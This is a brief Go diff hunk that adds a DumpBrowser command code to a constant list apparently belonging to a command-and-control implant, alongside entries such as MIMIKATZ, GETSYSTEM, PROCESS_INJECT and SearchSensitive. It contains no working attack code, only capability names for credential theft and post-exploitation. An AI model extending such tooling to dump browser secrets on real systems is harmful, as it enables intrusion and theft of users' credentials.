@@ -32,6 +32,7 @@ const (
 	DUMP_DATA            = 45
 	ExecuteLinuxBin      = 46
 	SearchSensitive      = 47
+	DumpBrowser          = 48
 	GETSYSTEM            = 80
 	MIMIKATZ             = 81
 	PROCESS_INJECT       = 82
